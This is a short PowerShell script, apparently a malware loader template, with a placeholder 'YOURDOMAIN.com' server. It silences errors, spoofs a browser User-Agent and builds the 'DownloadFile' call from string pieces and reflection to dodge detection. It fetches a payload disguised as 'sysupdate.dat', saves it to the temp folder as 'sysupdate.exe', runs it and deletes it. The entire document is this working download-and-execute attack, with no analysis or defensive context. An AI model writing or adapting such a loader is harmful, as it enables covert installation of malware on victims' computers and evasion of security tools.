$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$base = 'https://YOURDOMAIN.com'
$url = "$base/assets/sysupdate.dat"
$out = "$env:TEMP\sysupdate.exe"

# 1. Download File
$c = New-Object Net.WebClient
$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$m = $c.GetType().GetMethod(('{0}{1}{2}' -f 'Down','load','File'))
$m.Invoke($c, @($url, $out))

# 2. Execute Hidden
$sp = [System.Diagnostics.Process].GetMethod('Start', [Type[]]@([string], [string]))
$sp.Invoke($null, @($out, ''))

# 3. Cleanup
Start-Sleep -Seconds 2
Remove-Item $out -Force -ErrorAction SilentlyContinue
